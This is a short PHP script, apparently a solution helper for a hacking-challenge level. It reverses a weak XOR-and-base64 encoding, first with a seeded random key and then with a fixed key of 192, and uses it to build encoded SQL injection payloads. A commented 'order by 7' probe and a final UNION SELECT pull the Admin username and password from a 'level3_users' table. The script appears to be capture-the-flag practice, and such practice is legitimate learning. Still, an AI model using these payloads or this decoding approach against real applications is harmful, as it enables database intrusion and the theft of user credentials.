 <?php

	// warning! ugly code ahead :)
	// requires php5.x, sorry for that
  		
	// function encrypt($str)
	// {
	// 	$cryptedstr = "";
	// 	srand(3284724);
	// 	for ($i =0; $i < strlen($str); $i++)
	// 	{
	// 		$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
	// 		while(strlen($temp)<3)
	// 		{
	// 			$temp = "0".$temp;
	// 		}
	// 		$cryptedstr .= $temp. "";
	// 	}
	// 	return base64_encode($cryptedstr);
	// }

    // echo encrypt("Admin ' order by 7 #") 
  
	// function decrypt ($str)
	// {
	// 	srand(3284724);
	// 	if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
	// 	{
	// 		$str = base64_decode($str);
	// 		if ($str != "" && $str != null && $str != false)
	// 		{
	// 			$decStr = "";
				
	// 			for ($i=0; $i < strlen($str); $i+=3)
	// 			{
	// 				$array[$i/3] = substr($str,$i,3);
	// 			}

	// 			foreach($array as $s)
	// 			{
	// 				$a = $s ^ rand(0, 255);
	// 				$decStr .= chr($a);
	// 			}
				
	// 			return $decStr;
	// 		}
	// 		return false;
	// 	}
	// 	return false;
	// }
function encrypt($str)
    {
        $cryptedstr = "";
        for ($i =0; $i < strlen($str); $i++)
        {
            $temp = ord(substr($str,$i,1)) ^ 192;

            while(strlen($temp)<3)
            {
                $temp = "0".$temp;
            }
            $cryptedstr .= $temp. "";
        }
        return base64_encode($cryptedstr);
    }

    function decrypt ($str)
    {
        if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
        {
            $str = base64_decode($str);
            if ($str != "" && $str != null && $str != false)
            {
                $decStr = "";

                for ($i=0; $i < strlen($str); $i+=3)
                {
                    $array[$i/3] = substr($str,$i,3);
                }

                foreach($array as $s)
                {
                    $a = $s^192;
                    $decStr .= chr($a);
                }

                return $decStr;
            }
            return false;
        }
        return false;
    }

    echo(encrypt('union select 1,username,3,4,5,password,7 from level3_users where username=\'Admin\'#'));
?>